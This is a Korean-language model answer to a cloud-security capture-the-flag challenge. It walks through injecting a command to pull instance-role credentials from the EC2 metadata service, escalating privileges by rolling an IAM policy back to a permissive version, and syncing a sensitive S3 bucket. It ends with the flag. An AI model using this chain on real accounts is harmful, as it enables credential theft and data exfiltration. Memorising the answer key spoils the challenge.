# [cloud_secret_exfil] 모범 답안

1. 최초 제공된 2개의 자격 증명 중에서 easy route의 자격 증명을 이용하여 프로파일을 등록한다.
```bash
aws configure --profile easy_route
```

2. 자신의 권한을 확인하여 SSM 세션을 시작할 수 있다는 것을 확인한다.
```bash

```

3. 메타데이터서비스를 통해 인스턴스에 할당된 역할을 확인할 수 있다.
```bash
; TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/policy-rollback-rce-ec2-role
```

4. 얻은 자격증명을 자신의 프로필에 등록해준다
```bash
aws configure --profile rce_server
```

5. 해당 역할의 상세 정보를 먼저 확인한다
```bash
aws sts get-caller-identity --profile rce_server
```
- 이를 통해 역할의 arn과 이름정보를 확인할 수 있다.

6. 역할에 연결된 정책을 확인해본다.
```bash
aws iam list-attached-role-policies --role-name <역할 이름> --profile rce_server
```
해당 역할에 연결된 s3manager라는 이름의 정책 이름을 확인할 수 있다.

7. 정책의 버전을 확인해본다.
```bash
aws iam-get-policy --policy-arn <정책의 arn> --profile rce_server
```
정책의 버전이 현재 v1인것을 확인할 수 있다.

8. 현재 정책 버전의 권한을 확인해본다.

```bash
aws iam get-policy-version --policy-arn <정책의 arn> --profile rce_server --version-id v1
```
현재 버전에 `iam:SetDefaultPolicyVersion`이 존재하는 것을 확인 -> 다른 버전의 정책으로 교체 가능

9. 다른 버전의 정책을 확인해본다.
```bash
aws iam get-policy-version --policy-arn <정책의 arn> --profile rce_server --version-id v2
```
v2의 정책에 s3관련 권한이 모두 할당되있는 것을 확인할 수 있다.

10. v2의 정책으로 교체해준다.
```bash
aws iam set-default-policy-version --policy-arn <정책의 arn> --profile rce_server --version-id v2
```

11. S3에 접근이 가능해졌고 기밀데이터를 유출한다.
```bash
aws s3 ls

aws s3 ls s3://policy-rollback-rce-sensitive-data --profile rce_server

aws s3 sync s3://policy-rollback-rce-sensitive-data ./ --profile rce_server
```
flag.txt를 받아올 수 있다.

`flag` : FLAG{pO1iCy_rollb4CK_rcE_5uCCeS5}
